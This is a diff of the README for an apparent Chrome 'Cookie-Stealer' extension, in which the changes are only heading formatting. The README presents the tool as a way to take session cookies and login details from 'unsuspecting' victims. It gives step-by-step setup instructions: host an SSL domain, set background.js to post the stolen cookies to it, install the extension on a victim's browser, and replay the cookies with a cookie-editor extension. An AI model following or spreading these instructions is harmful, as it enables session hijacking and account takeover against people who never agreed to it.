@@ -1,23 +1,23 @@
 # Cookie-Stealer
 A Cookie Stealer for Chrome
 
-Introduction - 
+# Introduction - 
 Welcome to a Cookies Stealer for chrome.
 What is Cookie Stealing?
 
 Cookie Stealing gets the SESSION data or cookie information such as login details of any unsuspecting victim.
 
-Instructions - 
+# Instructions - 
 1. Make Sure have a domain server or simply a subdomain with ssl
 2. On the client side change the posturl variable in background.js to the desired domain or subdomain you will be using
 3. Drag extension or upload to google extensions
 4. Test on yourself or victim and watch the cookies flow in
 
-Ok what now?
+# Ok what now?
 
 - So you may asking yourself I got the cookies but how do I use it.
 - To use the cookies you will need an extension called cookie-editor
-Cookie Editor Link https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm?hl=en-US
+https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm?hl=en-US
 
 Now you need to put it in the json part of the extension:
 
